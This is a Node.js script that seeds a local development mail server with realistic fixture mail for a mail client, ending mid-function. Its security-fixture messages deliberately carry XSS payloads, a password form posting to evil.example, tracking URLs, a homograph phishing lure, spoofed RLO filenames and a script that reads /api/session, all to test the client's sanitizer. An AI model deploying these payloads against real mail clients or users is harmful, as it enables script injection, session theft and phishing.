// Seeds the dev mail stack with realistic mail for alice@tidings.test (and a little for bob/carol).
// Usage: node dev/mailserver/seed.mjs [--force]   (skips if INBOX already holds seed mail)
import { ImapFlow } from 'imapflow';
import nodemailer from 'nodemailer';
import MailComposer from 'nodemailer/lib/mail-composer';
import zlib from 'node:zlib';

const HOST = '127.0.0.1';
const PASS = 'tidings-dev';
const DOMAIN = 'tidings.test';
const NOW = Date.now();
const DAY = 86_400_000;
const FORCE = process.argv.includes('--force');

const ALICE = { name: 'Alice Mwangi', address: `alice@${DOMAIN}` };
const BOB = { name: 'Bob Otieno', address: `bob@${DOMAIN}` };
const CAROL = { name: 'Carol Njeri', address: `carol@${DOMAIN}` };
const DAN = { name: 'Dan Whitfield', address: 'dan@northwind.example' };
const PRIYA = { name: 'Priya Raman', address: 'priya@northwind.example' };
const LANDLORD = { name: 'Grace Kamau', address: 'grace.kamau@lettings.example' };

let seq = 0;
const mid = (tag) => `<${tag}-${++seq}@seed.${DOMAIN}>`;
const ago = (days, hours = 0) => new Date(NOW - days * DAY - hours * 3600_000);

async function compose(opts) {
  return new MailComposer({ ...opts, headers: { 'X-Tidings-Seed': '1', ...(opts.headers ?? {}) } }).compile().build();
}

// ---------- tiny binary fixtures ----------
function png(w, h, pixel) {
  const crcTable = (buf) => zlib.crc32(buf);
  const chunk = (type, data) => {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    const td = Buffer.concat([Buffer.from(type), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crcTable(td) >>> 0);
    return Buffer.concat([len, td, crc]);
  };
  const raw = Buffer.alloc((w * 3 + 1) * h);
  for (let y = 0; y < h; y++) {
    raw[y * (w * 3 + 1)] = 0;
    for (let x = 0; x < w; x++) {
      const [r, g, b] = pixel(x, y);
      const o = y * (w * 3 + 1) + 1 + x * 3;
      raw[o] = r;
      raw[o + 1] = g;
      raw[o + 2] = b;
    }
  }
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0);
  ihdr.writeUInt32BE(h, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', ihdr), chunk('IDAT', zlib.deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
}
const MOUNTAIN_PNG = png(320, 180, (x, y) => {
  const ridge = 110 - Math.abs(((x * 7) % 160) - 80) * 0.6 - (x % 37) * 0.3;
  if (y > ridge) return [40 + (y >> 2), 70 + (y >> 3), 50];
  return [120 + (y >> 1), 160 + (y >> 2), 220];
});
const AVATAR_PNG = png(48, 48, (x, y) => ((x - 24) ** 2 + (y - 24) ** 2 < 400 ? [230, 120, 60] : [250, 244, 236]));

function pdf(title, lines) {
  const text = [title, ...lines].map((l, i) => `BT /F1 ${i ? 11 : 16} Tf 56 ${760 - i * 22} Td (${l.replace(/[()\\]/g, '')}) Tj ET`).join('\n');
  const objs = [
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
    `<< /Length ${Buffer.byteLength(text)} >>\nstream\n${text}\nendstream`,
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
  ];
  let out = '%PDF-1.4\n';
  const offsets = [];
  objs.forEach((o, i) => {
    offsets.push(out.length);
    out += `${i + 1} 0 obj\n${o}\nendobj\n`;
  });
  const xref = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`;
  out += `trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(out, 'latin1');
}

// ISO-2022-JP encoder derived from the platform decoder (so every byte is round-trip verified).
const JIS = (() => {
  const map = new Map();
  const dec = new TextDecoder('iso-2022-jp');
  for (let a = 0x21; a <= 0x7e; a++)
    for (let b = 0x21; b <= 0x7e; b++) {
      const ch = dec.decode(Buffer.from([0x1b, 0x24, 0x42, a, b, 0x1b, 0x28, 0x42]));
      if (ch.length === 1 && ch !== '�' && !map.has(ch)) map.set(ch, [a, b]);
    }
  return map;
})();
function iso2022jp(str) {
  const out = [];
  let jis = false;
  for (const ch of str) {
    const code = ch.codePointAt(0);
    if (code < 0x80) {
      if (jis) out.push(0x1b, 0x28, 0x42), (jis = false);
      out.push(code);
    } else {
      const pair = JIS.get(ch);
      if (!pair) throw new Error(`no JIS mapping for ${ch}`);
      if (!jis) out.push(0x1b, 0x24, 0x42), (jis = true);
      out.push(...pair);
    }
  }
  if (jis) out.push(0x1b, 0x28, 0x42);
  const buf = Buffer.from(out);
  if (new TextDecoder('iso-2022-jp').decode(buf) !== str) throw new Error('ISO-2022-JP round trip failed');
  return buf;
}

const rfcDate = (d) => d.toUTCString().replace('GMT', '+0000');

// ---------- message definitions ----------
const inbox = [];
const sent = [];
const other = { Junk: [], Trash: [], Archive: [], Drafts: [], 'Receipts': [], 'Travel': [] };

function push(list, raw, date, flags = []) {
  list.push({ raw, date, flags });
}

async function seedConversations() {
  // 1. Long work thread (7 messages, mixed INBOX / Sent)
  const t1 = [];
  const roadmap = [
    [DAN, [ALICE, PRIYA], 'Q4 roadmap review', 21, `Hi Alice, Priya,\n\nAhead of Thursday's review I've pulled the Q4 candidates into one list:\n\n1. Offline mode for the field app\n2. Billing migration off the legacy processor\n3. SSO for enterprise tenants\n\nCan you each rank them by customer impact? I'd like to walk in with a recommendation rather than a menu.\n\nThanks,\nDan`],
    [ALICE, [DAN, PRIYA], 'Re: Q4 roadmap review', 21, `Thanks Dan.\n\nMy ranking: SSO first (three renewals are blocked on it), billing second, offline third. Offline is the most requested but the least tied to revenue this quarter.\n\nAlice`, true],
    [PRIYA, [ALICE, DAN], 'Re: Q4 roadmap review', 20, `I'd swap billing and SSO. The legacy processor contract ends in January and the migration needs eight weeks of buffer for reconciliation.\n\nPriya`],
    [DAN, [ALICE, PRIYA], 'Re: Q4 roadmap review', 20, `Good point on the contract date. Priya, can you confirm the end date with finance? If it's firm, billing goes first and SSO runs in parallel with a smaller team.`],
    [ALICE, [DAN, PRIYA], 'Re: Q4 roadmap review', 19, `Works for me if SSO keeps two engineers. I'll draft the staffing plan tonight and share it before the review.`, true],
    [PRIYA, [ALICE, DAN], 'Re: Q4 roadmap review', 18, `Finance confirmed: 31 January, no extension. Billing first it is.\n\nAttaching the reconciliation checklist from the last migration.`],
    [DAN, [ALICE, PRIYA], 'Re: Q4 roadmap review', 2, `Final plan approved in the exec sync. Thanks both — Alice, please send the staffing plan to the wider team on Monday.`],
  ];
  for (const [from, to, subject, days, text, mine] of roadmap) {
    const id = mid('roadmap');
    const raw = await compose({
      from,
      to,
      subject,
      text,
      messageId: id,
      date: ago(days, 3 + t1.length),
      inReplyTo: t1[t1.length - 1],
      references: t1.length ? [...t1] : undefined,
      attachments: subject === 'Re: Q4 roadmap review' && from === PRIYA && days === 18 ? [{ filename: 'reconciliation-checklist.pdf', content: pdf('Reconciliation checklist', ['1. Freeze legacy writes', '2. Dual-run for 14 days', '3. Compare ledgers daily', '4. Sign-off by finance']), contentType: 'application/pdf' }] : undefined,
    });
    t1.push(id);
    push(mine ? sent : inbox, raw, ago(days, 3 + t1.length), mine ? ['\\Seen'] : days < 3 ? [] : ['\\Seen']);
  }
  inbox.roadmapIds = t1;

  // 2. Flat viewing (with a reply from alice in Sent)
  const v1 = mid('flat');
  push(inbox, await compose({ from: LANDLORD, to: [ALICE], subject: 'Flat viewing on Saturday', messageId: v1, date: ago(9, 5),
    html: `<p>Hi Alice,</p><p>The two-bedroom on Riverside Drive is available for viewing on <b>Saturday at 11:00</b>. The building has a lift, a backup generator and covered parking.</p><p>Rent is KES 85,000 per month with a two-month deposit. Could you confirm the time works?</p><p>Kind regards,<br>Grace Kamau<br><span style="color:#777">Riverside Lettings</span></p>` }), ago(9, 5), ['\\Seen', '\\Answered']);
  const v2 = mid('flat');
  push(sent, await compose({ from: ALICE, to: [LANDLORD], subject: 'Re: Flat viewing on Saturday', messageId: v2, inReplyTo: v1, references: [v1], date: ago(9, 2),
    text: `Hi Grace,\n\nSaturday at 11 works. Is the deposit refundable if the inspection finds the water heater still faulty?\n\nAlice\n\nOn ${rfcDate(ago(9, 5))}, Grace Kamau wrote:\n> The two-bedroom on Riverside Drive is available for viewing on Saturday at 11:00.` }), ago(9, 2), ['\\Seen']);
  push(inbox, await compose({ from: LANDLORD, to: [ALICE], subject: 'Re: Flat viewing on Saturday', messageId: mid('flat'), inReplyTo: v2, references: [v1, v2], date: ago(8, 20),
    text: `Yes — the deposit is fully refundable, and the landlord has agreed to replace the heater before move-in. See you Saturday.\n\nGrace` }), ago(8, 20), ['\\Seen', '\\Flagged']);

  // 3. Invoice with a PDF
  push(inbox, await compose({ from: { name: 'Acme Hosting Billing', address: 'billing@acme-hosting.example' }, to: [ALICE], subject: 'Invoice #2041 — October 2026', messageId: mid('invoice'), date: ago(1, 4),
    html: `<table style="font-family:Arial;border-collapse:collapse;width:100%;max-width:560px"><tr><td style="background:#0f172a;color:#fff;padding:16px 20px;font-size:18px">Acme Hosting</td></tr><tr><td style="padding:20px">Your invoice for October is ready.<br><br><b>Amount due:</b> USD 48.00<br><b>Due date:</b> 15 November 2026<br><br>The PDF is attached. Thank you for your business.</td></tr></table>`,
    attachments: [{ filename: 'invoice-2041.pdf', content: pdf('Invoice #2041', ['Acme Hosting Ltd', 'Bill to: Alice Mwangi', 'VPS Standard (Oct 2026) .... USD 40.00', 'Backups .................... USD 8.00', 'Total ...................... USD 48.00']), contentType: 'application/pdf' }] }), ago(1, 4), []);

  // 4. Photos with an attached PNG and an inline cid image
  push(inbox, await compose({ from: CAROL, to: [ALICE], subject: 'Photos from the hike', messageId: mid('hike'), date: ago(4, 7),
    html: `<p>Alice! Here's the view from the second ridge — I still can't believe we made it up before the rain.</p><p><img src="cid:ridge@seed" alt="Ridge view" width="320" height="180"></p><p>The full-size one is attached. Same time next month?</p><p>— Carol</p>`,
    attachments: [
      { filename: 'ridge.png', content: MOUNTAIN_PNG, contentType: 'image/png', cid: 'ridge@seed' },
      { filename: 'ridge-full.png', content: MOUNTAIN_PNG, contentType: 'image/png' },
    ] }), ago(4, 7), ['\\Seen', '\\Flagged']);

  // 5. Contract draft with a docx-ish attachment
  push(inbox, await compose({ from: { name: 'Samuel Kiptoo', address: 'samuel@kiptoo-legal.example' }, to: [ALICE], cc: [BOB], subject: 'Contract draft v3 for review', messageId: mid('contract'), date: ago(3, 9),
    text: `Hi Alice,\n\nAttached is v3 of the services agreement. Changes since v2:\n- Payment terms moved to net 30\n- Liability cap set at 12 months of fees\n- Added a data-processing annex\n\nPlease review clause 7.2 in particular before Friday.\n\nSamuel`,
    attachments: [{ filename: 'Services Agreement v3.docx', content: Buffer.concat([Buffer.from('PK\u0003\u0004'), Buffer.from('word/document.xml placeholder for dev fixtures')]), contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' }] }), ago(3, 9), []);

  // 6. A few short personal/work messages
  const misc = [
    [BOB, 'Lunch Thursday?', 'Want to try the new Ethiopian place near the office? 12:30?', 0.3, []],
    [{ name: 'GitHub', address: 'noreply@github.example' }, '[tidings] Pull request #42: Keyboard shortcut overlay', 'apolloshadrack requested your review on #42.\n\nAdds a ? overlay listing every shortcut, grouped by context.', 0.8, []],
    [{ name: 'Kenya Airways', address: 'bookings@airline.example' }, 'Your booking NBO → MBA is confirmed', 'Booking reference: QX7P2L\nDeparture: 14 Nov 2026, 07:40\nSeat: 12A\n\nOnline check-in opens 30 hours before departure.', 6, ['\\Seen']],
    [{ name: 'Mum', address: 'wanjiru.mwangi@family.example' }, 'Sunday lunch', 'Your uncle is visiting on Sunday, come by at 1pm. Bring the photos from the hike if you have them printed!', 5, ['\\Seen']],
    [PRIYA, 'Billing migration kickoff notes', 'Notes from today are in the shared doc. Two open questions: who owns the refunds edge cases, and do we freeze pricing changes during the dual-run?', 1.5, []],
    [{ name: 'M-Pesa', address: 'statements@payments.example' }, 'Your October statement is ready', 'Your monthly statement for October 2026 is now available in the app.', 0.5, []],
  ];
  for (const [from, subject, text, days, flags] of misc) push(inbox, await compose({ from, to: [ALICE], subject, text, messageId: mid('misc'), date: ago(days) }), ago(days), flags);
}

async function seedNewsletters() {
  const unsub = (host, id) => ({
    'List-Unsubscribe': `<https://${host}/unsubscribe?u=${id}>, <mailto:unsubscribe@${host}?subject=unsubscribe-${id}>`,
    'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
    'List-Id': `<news.${host}>`,
  });
  push(inbox, await compose({
    from: { name: 'Kestrel Outdoor', address: 'news@kestrel-outdoor.example' }, to: [ALICE], subject: 'Last weekend: 20% off rain shells', messageId: mid('news'), date: ago(2, 6), headers: unsub('kestrel-outdoor.example', 'a81f'),
    html: `<div style="max-width:600px;margin:auto;font-family:Helvetica,Arial,sans-serif">
<img src="https://images.kestrel-outdoor.example/hero-rain.jpg" width="600" height="240" alt="Hikers in the rain" style="display:block;width:100%">
<h1 style="font-size:28px">Built for the long rains</h1>
<p>Our Ridgeline shell is 20% off until Sunday. Fully taped seams, pit zips, and a hood that actually fits over a helmet.</p>
<p><a href="https://kestrel-outdoor.example/ridgeline?utm_source=newsletter&utm_medium=email&utm_campaign=rain26&utm_content=cta" style="background:#14532d;color:#fff;padding:12px 20px;text-decoration:none;border-radius:6px">Shop the sale</a></p>
<p style="font-size:12px;color:#888">You're receiving this because you bought boots from us in 2025. <a href="https://kestrel-outdoor.example/unsubscribe?u=a81f">Unsubscribe</a></p>
<img src="https://t.kestrel-outdoor.example/open/a81f-7c2.gif" width="1" height="1" alt="" style="display:none">
</div>` }), ago(2, 6), []);
  push(inbox, await compose({
    from: { name: 'The Weekly Byte', address: 'editor@weeklybyte.example' }, to: [ALICE], subject: 'The Weekly Byte #187: SQLite everywhere', messageId: mid('news'), date: ago(6, 2), headers: unsub('weeklybyte.example', 'b77'),
    html: `<div style="max-width:620px;margin:auto;font-family:Georgia,serif;line-height:1.6">
<p style="font-size:12px;color:#999;text-transform:uppercase;letter-spacing:.1em">Issue 187</p>
<h1>SQLite everywhere</h1>
<p><img src="https://picsum.photos/seed/tidings-byte/600/240" width="600" height="240" alt="Server racks" style="width:100%;height:auto"></p>
<p>This week: why embedded databases keep winning at the edge, a look at WAL mode under contention, and three CLI tools we can't stop using.</p>
<h2>1. The case for boring storage</h2>
<p>When your write volume fits on one machine, a single file with a good journal is hard to beat. <a href="https://weeklybyte.example/r/183?utm_source=byte&utm_medium=email">Read the essay →</a></p>
<h2>2. WAL mode, measured</h2>
<p>Readers never block writers, but checkpoint starvation is real. <a href="https://weeklybyte.example/r/184?utm_source=byte&utm_medium=email&utm_campaign=187">The benchmarks →</a></p>
<img src="https://open.weeklybyte.example/pixel/b77-187.png" width="1" height="1" alt="">
</div>` }), ago(6, 2), ['\\Seen']);
  push(inbox, await compose({
    from: { name: 'Launchpad Daily', address: 'digest@launchpad.example' }, to: [ALICE], subject: 'Today’s top 5 launches', messageId: mid('news'), date: ago(0.2), headers: unsub('launchpad.example', 'c3'),
    html: `<h2>Top launches today</h2><ol><li><b>Inkwell</b> — markdown notes that sync over git</li><li><b>Tally</b> — invoices from a spreadsheet</li><li><b>Pathfinder</b> — hiking routes with offline maps</li><li><b>Quorum</b> — async standups in Slack</li><li><b>Brewlog</b> — a coffee journal</li></ol><img src="https://launchpad.example/o.gif?id=c3" width="1" height="1">` }), ago(0.2), []);
  push(other.Receipts, await compose({
    from: { name: 'Bolt', address: 'receipts@rides.example' }, to: [ALICE], subject: 'Your Tuesday evening trip', messageId: mid('receipt'), date: ago(12), headers: unsub('rides.example', 'r1'),
    html: `<p>Thanks for riding. Total: <b>KES 640</b> (Westlands → Kilimani, 4.2 km).</p>` }), ago(12), ['\\Seen']);
}

async function seedSecurityFixtures() {
  push(inbox, await compose({
    from: { name: 'Fixture Bot', address: 'fixtures@security.example' }, to: [ALICE], subject: '[Security fixture] Script and handler soup — nothing should run', messageId: mid('sec'), date: ago(7, 1),
    html: `<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example/refresh"><base href="https://evil.example/">
<style>@import url(https://evil.example/track.css);@font-face{font-family:x;src:url(https://evil.example/font.woff)} body{background:url(https://evil.example/bg.gif)} .hov:hover{background:url(https://evil.example/hover.gif)}</style></head><body>
<h1>Security fixture</h1><p>If any alert box, navigation, network request to evil.example or form appears, the sanitizer has a bug.</p>
<script>alert('xss-script')</script>
<img src="x" onerror="alert('xss-onerror')">
<a href="javascript:alert('xss-js-link')">javascript: link</a> · <a href="JaVaScRiPt:alert(1)">mixed-case javascript: link</a> · <a href="data:text/html,<script>alert(1)</script>">data: link</a>
<form action="https://evil.example/steal" method="post"><input name="password" type="password" placeholder="Re-enter your password"><button>Verify</button></form>
<iframe src="https://evil.example/frame" width="300" height="80"></iframe>
<svg onload="alert('xss-svg')" width="20" height="20"><circle r="10" cx="10" cy="10"/></svg>
<math><mi xlink:href="javascript:alert('math')">m</mi></math>
<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">
<div class="hov" style="background-image:url('https://evil.example/style.gif');padding:8px">hover me (CSS url tracking)</div>
<img srcset="https://evil.example/srcset.png 2x" src="https://evil.example/src.png" width="40">
<a href="https://evil.example/ping" ping="https://evil.example/ping-track">link with ping</a>
<noscript><p title="</noscript><img src=x onerror=alert('mxss')>"></noscript>
<details open ontoggle="alert('xss-toggle')"><summary>details ontoggle</summary></details>
<video poster="https://evil.example/poster.jpg" src="https://evil.example/v.mp4"></video>
<img src="https://evil.example/pixel.gif" width="1" height="1">
</body></html>` }), ago(7, 1), []);

  push(inbox, await compose({
    from: { name: 'security@bank.example', address: 'phish@evil.example' }, to: [ALICE], subject: '[Security fixture] Unusual sign-in attempt — verify now', messageId: mid('sec'), date: ago(3, 1),
    html: `<p>We detected an unusual sign-in to your account from a new device.</p>
<p>Verify your identity within 24 hours: <a href="https://bank-example.evil.example/verify?id=9921">https://bank.example/verify</a></p>
<p>Or use our backup portal: <a href="https://xn--ypal-43d9g.example/login">https://раypal.example/login</a> (Cyrillic homograph)</p>
<p>Reference: ‮txt.exe‬</p>` }), ago(3, 1), []);

  push(inbox, await compose({
    from: { name: 'Fixture Bot', address: 'fixtures@security.example' }, to: [ALICE], subject: '[Security fixture] Dangerous attachments (SVG, HTML, RLO filename)', messageId: mid('sec'), date: ago(7, 2),
    text: 'These attachments must be served as downloads (application/octet-stream), never rendered inline in the app origin.',
    attachments: [
      { filename: 'chart.svg', content: '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><script>alert("svg-attachment")</script><rect width="100" height="100" fill="red"/></svg>', contentType: 'image/svg+xml' },
      { filename: 'statement.html', content: '<html><body><script>fetch("/api/session").then(r=>r.text()).then(t=>alert(t))</script>Statement</body></html>', contentType: 'text/html' },
      { filename: 'report‮fdp.exe', content: Buffer.from('MZ fake executable for filename-spoof testing'), contentType: 'application/octet-stream' },
      { filename: 'pretend-image.png', content: Buffer.from('<html><script>alert("polyglot")</script></html>'), contentType: 'image/png' },
    ] }), ago(7, 2), ['\\Seen']);
}

function rawMessage({ from, to, subject, date, contentType, cte = '8bit', body, extra = '' }) {
  const head = [
    `From: ${from}`, `To: ${to}`, `Subject: ${subject}`, `Date: ${rfcDate(date)}`, `Message-ID: ${mid('raw')}`,
    'MIME-Version: 1.0', `Content-Type: ${contentType}`, `Content-Transfer-Encoding: ${cte}`, 'X-Tidings-Seed: 1', extra,
  ].filter(Boolean).join('\r\n');
  return Buffer.concat([Buffer.from(head + '\r\n\r\n', 'latin1'), Buffer.isBuffer(body) ? body : Buffer.from(body, 'utf8')]);
}

async function seedInternational() {
  // Hebrew (RTL)
  push(inbox, await compose({ from: { name: 'נועה לוי', address: 'noa@studio.example' }, to: [ALICE], subject: 'פגישה ביום שלישי', messageId: mid('intl'), date: ago(10),
    html: `<div dir="rtl" style="font-family:Arial"><p>שלום אליס,</p><p>האם נוח לך להיפגש ביום שלישי בשעה 10:00 כדי לעבור על העיצוב החדש? אשלח קישור לפגישה מראש.</p><p>תודה,<br>נועה</p></div>` }), ago(10), ['\\Seen']);
  // windows-1252 bytes mislabelled as iso-8859-1 (smart quotes, en dash, ellipsis, euro)
  const cp1252 = Buffer.concat([
    Buffer.from('Hi Alice,\r\n\r\nThe quote for the venue is ', 'latin1'), Buffer.from([0x80]), Buffer.from('1,200 ', 'latin1'),
    Buffer.from([0x96]), Buffer.from(' that includes catering. The manager said ', 'latin1'), Buffer.from([0x93]),
    Buffer.from("we'll hold the date until Friday", 'latin1'), Buffer.from([0x94]), Buffer.from([0x85]),
    Buffer.from("\r\n\r\nIt's the old caf\xe9 on Ngong Road.\r\n\r\nMarc\r\n", 'latin1'),
  ]);
  push(inbox, rawMessage({ from: 'Marc Dubois <marc@events.example>', to: 'Alice Mwangi <alice@tidings.test>', subject: 'Venue quote (cp1252 labelled latin1)', date: ago(11), contentType: 'text/plain; charset=iso-8859-1', body: cp1252 }), ago(11), ['\\Seen']);
  // ISO-2022-JP
  const jpSubject = '会議の予定について';
  const jpBody = '山田です。\r\n\r\n来週の会議は水曜日の午後二時からに変更になりました。\r\n資料は前日までにお送りします。\r\n\r\nよろしくお願いいたします。\r\n';
  const encSubject = `=?ISO-2022-JP?B?${iso2022jp(jpSubject).toString('base64')}?=`;
  push(inbox, rawMessage({ from: `=?ISO-2022-JP?B?${iso2022jp('山田太郎').toString('base64')}?= <yamada@tokyo-office.example>`, to: 'alice@tidings.test', subject: encSubject, date: ago(13), contentType: 'text/plain; charset=ISO-2022-JP', cte: '7bit', body: iso2022jp(jpBody) }), ago(13), []);
  // Long plain text with quoted history (format=flowed)
  const long = [
    'Alice,', '', 'Following up on the warehouse lease. Short version: the landlord accepted our counter on the rent but not on the break clause.', '',
    ...Array.from({ length: 30 }, (_, i) => `Point ${i + 1}: ${['The service charge cap stays at 8% per year.', 'Parking for four vans is included.', 'Fit-out period is six weeks rent-free.', 'Insurance must name the landlord as co-insured.', 'Signage needs written approval but cannot be unreasonably withheld.'][i % 5]}`),
    '', 'Let me know if you want me to push again on the break clause.', '', 'Joseph', '',
    `On ${rfcDate(ago(16))}, Alice Mwangi wrote:`, '> Joseph, can you send me where we landed on each point?', '> I need to brief the board on Thursday.', '>',
    `>> On ${rfcDate(ago(17))}, Joseph Omondi wrote:`, '>> The landlord came back with a revised offer. I will summarise tomorrow.',
  ].join('\r\n');
  push(inbox, rawMessage({ from: 'Joseph Omondi <joseph@omondi-properties.example>', to: 'Alice Mwangi <alice@tidings.test>', subject: 'Re: Warehouse lease — where we landed', date: ago(15), contentType: 'text/plain; charset=utf-8; format=flowed', body: long }), ago(15), ['\\Seen']);
}

async function seedJunkTrash() {
  push(other.Junk, await compose({ from: { name: 'Prize Desk', address: 'winner@lotto.example' }, to: [ALICE], subject: 'CONGRATULATIONS!!! You have won $1,000,000', messageId: mid('junk'), date: ago(2), html: '<h1 style="color:red">CLAIM NOW</h1><p>Send your bank details to claim.</p><img src="https://lotto.example/t.gif">' }), ago(2), []);
  push(other.Junk, await compose({ from: { name: 'Crypto Signals', address: 'alpha@signals.example' }, to: [ALICE], subject: '1000x gains guaranteed — join today', messageId: mid('junk'), date: ago(5), text: 'Limited seats. Reply YES.' }), ago(5), []);
  push(other.Trash, await compose({ from: { name: 'Old Newsletter', address: 'hello@oldnews.example' }, to: [ALICE], subject: 'We miss you!', messageId: mid('trash'), date: ago(20), text: 'It has been a while.' }), ago(20), ['\\Seen']);
  push(other.Trash, await compose({ from: BOB, to: [ALICE], subject: 'ignore this, wrong person', messageId: mid('trash'), date: ago(14), text: 'Sorry, meant to send this to Ben.' }), ago(14), ['\\Seen']);
  push(other.Travel, await compose({ from: { name: 'Serena Hotels', address: 'reservations@hotel.example' }, to: [ALICE], subject: 'Reservation confirmed: 14–16 Nov, Mombasa', messageId: mid('travel'), date: ago(6, 1), text: 'Confirmation number 88213. Check-in from 14:00.', attachments: [{ filename: 'hotel-logo.png', content: AVATAR_PNG, contentType: 'image/png' }] }), ago(6, 1), ['\\Seen']);
  push(other.Archive, await compose({ from: DAN, to: [ALICE], subject: 'Offsite agenda (archived)', messageId: mid('arch'), date: ago(40), text: 'Agenda for the September offsite is attached in the shared drive.' }), ago(40), ['\\Seen']);
}

function bulkMessages(n) {
  const first = ['Amina', 'Brian', 'Chloe', 'David', 'Esther', 'Faith', 'George', 'Hassan', 'Ivy', 'James', 'Kevin', 'Lydia', 'Moses', 'Nadia', 'Oscar', 'Peris', 'Quentin', 'Ruth', 'Steve', 'Tabitha', 'Umar', 'Vera', 'Wilson', 'Ximena', 'Yusuf', 'Zawadi'];
  const last = ['Achieng', 'Baraka', 'Chebet', 'Duncan', 'Engel', 'Farah', 'Gitau', 'Hughes', 'Imani', 'Juma', 'Kariuki', 'Lopez', 'Mutua', 'Nyambura', 'Ochieng', 'Patel'];
  const orgs = ['northwind.example', 'contoso.example', 'fabrikam.example', 'tailspin.example', 'wingtip.example', 'adventure-works.example'];
  const topics = ['Budget', 'Hiring plan', 'Vendor shortlist', 'Sprint retro', 'Security review', 'Office move', 'Customer escalation', 'Pricing update', 'Board pack', 'Design critique', 'Release notes', 'Quarterly OKRs', 'Data retention', 'Onboarding checklist', 'Incident report'];
  const qual = ['draft', 'final', 'v2', 'for sign-off', 'questions', 'next steps', 'notes', 'follow-up', 'summary'];
  const lines = ['Sharing the latest version below.', 'Can you take a look before Friday?', 'Two open questions remain, see inline.', 'Numbers updated with the September actuals.', 'No change to the timeline.', 'Flagging a risk on the vendor side.', 'Happy to walk through it on a call.', 'Approved from my side.'];
  const rnd = (() => { let s = 42; return () => ((s = (s * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff); })();
  const pick = (a) => a[Math.floor(rnd() * a.length)];
  const out = [];
  const year = Date.UTC(2025, 0, 1);
  let thread = null;
  for (let i = 0; i < n; i++) {
    const f = pick(first), l = pick(last), org = pick(orgs);
    const from = `${f} ${l} <${f.toLowerCase()}.${l.toLowerCase()}@${org}>`;
    const date = new Date(year + Math.floor(rnd() * 364 * DAY) + Math.floor(rnd() * DAY));
    const id = `<bulk-${i}@seed.${DOMAIN}>`;
    let subject, refs = '';
    if (thread && rnd() < 0.35) {
      subject = `Re: ${thread.subject}`;
      refs = `In-Reply-To: ${thread.ids[thread.ids.length - 1]}\r\nReferences: ${thread.ids.join(' ')}`;
      thread.ids.push(id);
    } else {
      subject = `${pick(topics)} — ${pick(qual)}`;
      thread = { subject, ids: [id] };
    }
    const body = `Hi Alice,\r\n\r\n${pick(lines)} ${pick(lines)}\r\n\r\n${pick(lines)}\r\n\r\nThanks,\r\n${f}\r\n`;
    const head = [`From: ${from}`, 'To: Alice Mwangi <alice@tidings.test>', `Subject: ${subject}`, `Date: ${rfcDate(date)}`, `Message-ID: ${id}`, refs, 'MIME-Version: 1.0', 'Content-Type: text/plain; charset=utf-8', 'Content-Transfer-Encoding: 8bit', 'X-Tidings-Seed: bulk'].filter(Boolean).join('\r\n');
    const flags = rnd() < 0.85 ? ['\\Seen'] : [];
    if (rnd() < 0.04) flags.push('\\Flagged');
    out.push({ raw: Buffer.from(`${head}\r\n\r\n${body}`, 'utf8'), date, flags });
  }
  return out;
}

async function login(user) {
  const c = new ImapFlow({ host: HOST, port: 1143, secure: false, doSTARTTLS: false, auth: { user, pass: PASS }, logger: false });
  await c.connect();
  return c;
}

async function appendAll(c, path, list) {
  for (const m of list) await c.append(path, m.raw, m.flags, m.date);
}

async function viaSmtp() {
  const t = nodemailer.createTransport({ host: HOST, port: 2525, secure: false, ignoreTLS: true, auth: { user: BOB.address, pass: PASS } });
  const ids = inbox.roadmapIds;
  await t.sendMail({ from: BOB, to: [ALICE], subject: 'Re: Q4 roadmap review', text: 'Late to this, but +1 to billing first. I can lend one engineer to SSO from the platform team.', inReplyTo: ids[ids.length - 1], references: ids, headers: { 'X-Tidings-Seed': 'smtp' } });
  await t.sendMail({ from: BOB, to: [ALICE, CAROL], subject: 'Team photo for the website', text: 'Can you both send me a recent headshot by Wednesday? Plain background if possible.', attachments: [{ filename: 'example-headshot.png', content: AVATAR_PNG }], headers: { 'X-Tidings-Seed': 'smtp' } });
  await t.sendMail({ from: BOB, to: [ALICE], subject: 'Parking spot swap', text: 'I am out next week, take my spot (B12) if you like.', headers: { 'X-Tidings-Seed': 'smtp' } });
  t.close();
}

async function main() {
  const alice = await login(ALICE.address);
  const lock = await alice.getMailboxLock('INBOX');
  const existing = (await alice.search({ header: { 'x-tidings-seed': '' } }, { uid: true })) || [];
  lock.release();
  if (existing.length && !FORCE) {
    console.log(`seed: alice already has ${existing.length} seed messages in INBOX — skipping (use --force or npm run mail:reset)`);
    await alice.logout();
    return;
  }

  await seedConversations();
  await seedNewsletters();
  await seedSecurityFixtures();
  await seedInternational();
  await seedJunkTrash();

  for (const path of ['Receipts', 'Travel', 'Projects', 'Projects/2025 Archive']) {
    await alice.mailboxCreate(path).catch(() => undefined);
    await alice.mailboxSubscribe(path).catch(() => undefined);
  }
  await appendAll(alice, 'INBOX', inbox);
  await appendAll(alice, 'Sent', sent);
  for (const [path, list] of Object.entries(other)) await appendAll(alice, path, list);
  const t0 = Date.now();
  const bulk = bulkMessages(2500);
  await appendAll(alice, 'Projects/2025 Archive', bulk);
